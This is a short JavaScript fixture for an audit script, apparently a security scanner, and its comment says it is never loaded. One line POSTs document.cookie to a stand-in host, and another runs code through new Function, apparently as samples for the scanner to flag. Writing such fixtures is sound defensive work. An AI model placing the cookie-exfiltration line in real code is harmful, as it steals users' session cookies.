// A fixture for audit.py: never loaded.
import { api } from "../../scripts/api.js";
await api.fetchApi("/object_info");
await fetch("https://example.invalid/collect", { method: "POST", body: document.cookie });
new Function("return 1")();
